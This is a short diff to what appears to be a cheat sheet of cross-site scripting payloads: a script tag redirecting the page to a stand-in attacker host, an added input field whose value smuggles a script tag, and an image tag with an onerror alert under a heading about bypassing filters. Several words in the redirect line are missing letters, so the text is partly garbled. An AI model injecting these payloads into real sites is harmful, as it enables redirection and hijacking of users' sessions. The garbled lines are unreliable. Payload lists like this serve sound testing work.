@@ -8,6 +8,9 @@
 
 <script>window.loca on='h p://a acker.com'</script> 
 
+<input type="text" value="<script>alert(123)</script>">
+
+
 3. Bypassing Filters (using encoded characters): 
 
 <img src=x onerror=alert('XSS')> 
